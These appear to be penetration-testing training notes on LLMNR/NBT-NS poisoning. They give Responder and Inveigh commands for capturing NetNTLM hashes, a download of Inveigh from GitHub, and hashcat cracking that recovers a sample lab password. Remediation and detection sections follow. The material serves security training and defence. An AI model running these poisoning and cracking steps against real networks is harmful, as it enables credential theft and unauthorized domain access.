# LLMNR/NBT-NS Poisoning - from Linux
common way to gather credentials and gain an initial foothold during an assessment: a Man-in-the-Middle attack on Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcasts. Depending on the network, this attack may provide low-privileged or administrative level password hashes that can be cracked offline or even cleartext credentials. Though not covered in this module, these hashes can also sometimes be used to perform an SMB Relay attack to authenticate to a host or multiple hosts in the domain with administrative privileges without having to crack the password hash offline

## LLMNR & NBT-NS Primer
**LLMNR** (port 5355/UDP) and **NBT-NS** (port 137/UDP) are Windows fallback name resolution protocols used when DNS fails. They allow any host on the local network to respond to name resolution requests. (it ask via LLMNR first if it fail again it will ask via NBT-NS)

Attackers can exploit this using tools like **Responder** to **poison** these requests by pretending to be the correct host. When a victim system communicates with the attacker (believing it's the real host), the attacker can:
- **Capture NetNTLMv2 hashes** for offline cracking (to get cleartext passwords)
- **Relay** the authentication to another host or service (e.g., LDAP) if SMB signing is disabled

This can lead to **unauthorized access**, potentially even **admin-level access** in a Windows domain environment.

==Example:==
1. A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.
2. The DNS server responds, stating that this host is unknown.
3. The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.
4. The attacker (us with `Responder` running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.
5. The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
6. This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.
### TTPs

The goal is to capture **NetNTLMv1** and **NetNTLMv2** hashes (==challenge-response for NTLMv1/v2 Protocol==) transmitted over the network. These hashes are then cracked offline using tools like Hashcat or John to reveal the cleartext password. This password can help gain initial access to the domain or escalate privileges if the captured account has higher rights.

> ⚠️ WARNING: Responder captures **NetNTLMv1** and **NetNTLMv2** (challenge-response hashes), NOT actual NTLMv1/NTLMv2 password hashes!
> ❌ NetNTLM hashes CANNOT be used in Pass-the-Hash attacks.
> ✅ They must be cracked offline with tools like Hashcat (-m 5500 or -m 5600) to recover the real password.

- **Responde**r: Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.  
- **Inveigh(Windows)**: Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.  
- **Metasploit** : Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.

Both tools can be used to attack the following protocols:
```bash
LLMNR        - UDP 5355
DNS          - UDP/TCP 53
mDNS         - UDP 5353
NBNS (NetBIOS Name Service)
             - UDP 137
DHCP         - UDP 67 (server), UDP 68 (client)
ICMP         - IP protocol 1 (no ports; ICMP messages, not port-based)
HTTP         - TCP 80
HTTPS        - TCP 443
SMB          - TCP 445 (modern SMB), TCP 139 (NetBIOS over TCP/legacy)
LDAP         - TCP/UDP 389 (LDAP), TCP 636 (LDAPS - LDAP over TLS)
WebDAV       - Typically over HTTP/HTTPS -> TCP 80 / TCP 443
Proxy Auth   - HTTP proxy authentication (HTTP 407); common proxy ports TCP 3128, 8080, 8000, 8888 (varies)

Responder also has support for:
MSSQL        - TCP 1433
DCE-RPC      - TCP 135 (RPC endpoint mapper) and dynamic high ports (e.g. 49152–65535 / ephemeral)
FTP          - TCP 21 (control), TCP 20 (data for active FTP)
POP3         - TCP 110 (POP3), TCP 995 (POP3S over TLS)
IMAP         - TCP 143 (IMAP), TCP 993 (IMAPS over TLS)
SMTP         - TCP 25 (SMTP), TCP 465 (SMTPS legacy), TCP 587 (submission)

```
#### Using Responder  
> must run the tool with sudo privileges or as root

make sure the following ports are available on our attack host:
```bash
UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
```

Responder will print the output on screen and write it to a log file per host located in the `/usr/share/responder/logs` directory in the format `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`

```bash
responder -h
# -v verbosity
# -I specifies the network interface to use (required).
# -A flag puts us into analyze mode.
# -f attempt to fingerprint the remote host operating system and version.
# -w starts the rogue WPAD proxy server to capture HTTP requests and potentially credentials.
# -F forces NTLM/Basic authentication when a client tries to retrieve the wpad.dat file (may cause login prompts).
# -P forces proxy authentication (NTLM transparently or Basic with prompt); effective with -r.
-----------------------------

## Starting Responder with Default Settings
  sudo responder -I ens224 
    # hashes saved in /usr/share/responder/logs , formate (MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt
  # we can pass these hashes to Hashcat using hash modes:
    # NetNTLMv2 => 5600 
    # NetNTLMv1 => 5500
    # other types => https://hashcat.net/wiki/doku.php?id=example_hashes
```


> ⚠️ WARNING: Responder captures **NetNTLMv1** and **NetNTLMv2** (challenge-response hashes), NOT actual NTLMv1/NTLMv2 password hashes!
> ❌ NetNTLM hashes CANNOT be used in Pass-the-Hash attacks.
> ✅ They must be cracked offline with tools like Hashcat (-m 5500 or -m 5600) to recover the real password.


 let it run for a while in a tmux window while we perform other enumeration tasks
Once we have enough, we need to get these hashes into a usable format for us right now. NetNTLMv2 hashes are very useful once cracked, but cannot be used for techniques such as pass-the-hash by cracking them offline

 **Cracking an NTLMv2 Hash With Hashcat:**
 ```bash
 hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
# Status...........: Cracked
#FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:010100000000000080f519d1432cd80136f3af14556f047800000000020008004900340046004e0001001e00570049004e002d0032004e004c005100420057004d00310054005000490004003400570049004e002d0032004e004c005100420057004d0031005400500049002e004900340046004e002e004c004f00430041004c00030014004900340046004e002e004c004f00430041004c00050014004900340046004e002e004c004f00430041004c000700080080f519d1432cd80106000400020000000800300030000000000000000000000000300000227f23c33f457eb40768939489f1d4f76e0e07a337ccfdd45a57d9b612691a800a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:Klmcargo2
# <username>::<domain>:<server_challenge_hex>:<ntlmv2_response_blob_hex>
```
==RESULTS:==
- **User: FOREND, Password: Klmcargo2**
>don't waste precious assessment time attempting to crack hashes for users that will not help us move further toward our goal


---

# LLMNR/NBT-NS Poisoning - from Windows

we land on a Windows host as a local admin, and would like to look to further our access, the tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh) works similar to Responder, but is written in PowerShell and C#. Inveigh can listen to IPv4 and IPv6 and several other protocols, including `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`, and Proxy Auth.

**setup**
```bash
# Inveigh.ps1 (powershell version)
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh/Inveigh.ps1" -OutFile "C:\Users\Public\Inveigh.ps1"

# Inveigh.exe (binary version)
git clone https://github.com/Kevin-Robertson/Inveigh.git
# compiling it yourself using Visual Studio
```
## Using Inveigh 

`Inveigh.ps1 (powershell version):`
```powershell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters 
# https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters

# LLMNR and NBNS spoofing
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

`Inveigh.exe (binary version):`
```powershell
# run capturing hashes as defaults 
.\Inveigh.exe -fileoutput Y

entre [esc] # enter the console while Inveigh is running.
HELP 
GET NTLMV2  # get captured NTLMv2 hashes; add search string to filter results
GET NTLMV2USERNAMES # get usernames and source IPs/hostnames for captured NTLMv2 hashes
 # with -fileoutput Y u will saved the hashes : 
 # Inveigh-NTLMv2.txt : SourceIP, Hostname, DOMAIN\username, short-hex
 # Inveigh-NTLMv2Users.txt : <username>::<domain>:<server_challenge_hex>:<ntlmv2_response_blob_hex>
 
```

---
# Remediation
Mitre ATT&CK lists this technique as [ID: T1557.001](https://attack.mitre.org/techniques/T1557/001), `Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay`.

 **disable LLMNR and NBT-NS:**
1. disable ==LLMNR== in Group Policy by going to Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."
![[Pasted image 20250730151232.png]]

2. Disable NBT-NS by opening `Network and Sharing Center` under `Control Panel`, clicking on `Change adapter settings`, right-clicking on the adapter to view its properties, selecting `Internet Protocol Version 4 (TCP/IPv4)`, and clicking the `Properties` button, then clicking on `Advanced` and selecting the `WINS` tab and finally selecting `Disable NetBIOS over TCP/IP`.
![[Pasted image 20250730151905.png]]

`2.1` While it is not possible to disable NBT-NS directly via GPO, we can create a PowerShell script under Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup with something like the following:
```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```
In the Local Group Policy Editor, we will need to double click on `Startup`, choose the `PowerShell Scripts` tab, and select "For this GPO, run scripts in the following order" to `Run Windows PowerShell scripts first`, and then click on `Add` and choose the script. For these changes to occur, we would have to either reboot the target system or restart the network adapter.
![[Pasted image 20250730152858.png]]
To push this out to all hosts in a domain, we could create a GPO using `Group Policy Management` on the Domain Controller and host the script on the SYSVOL share in the scripts folder and then call it via its UNC path such as:
`\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts`
Once the GPO is applied to specific OUs and those hosts are restarted, the script will run at the next reboot and disable NBT-NS, provided that the script still exists on the SYSVOL share and is accessible by the host over the network.

Other mitigations include filtering network traffic to block LLMNR/NetBIOS traffic and enabling SMB Signing to prevent NTLM relay attacks. Network intrusion detection and prevention systems can also be used to mitigate this activity, while network segmentation can be used to isolate hosts that require LLMNR or NetBIOS enabled to operate correctly.

---
## Detection

It is not always possible to disable LLMNR and NetBIOS, and therefore we need ways to detect this type of attack behavior. One way is to use the attack against the attackers by injecting LLMNR and NBT-NS requests for non-existent hosts across different subnets and alerting if any of the responses receive answers which would be indicative of an attacker spoofing name resolution responses. This [blog post](https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/) explains this method more in-depth.

Furthermore, hosts can be monitored for traffic on ports UDP 5355 and 137, and event IDs [4697](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4697) and [7045](https://www.manageengine.com/products/active-directory-audit/kb/system-events/event-id-7045.html) can be monitored for. Finally, we can monitor the registry key `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` for changes to the `EnableMulticast` DWORD value. A value of `0` would mean that LLMNR is disabled.
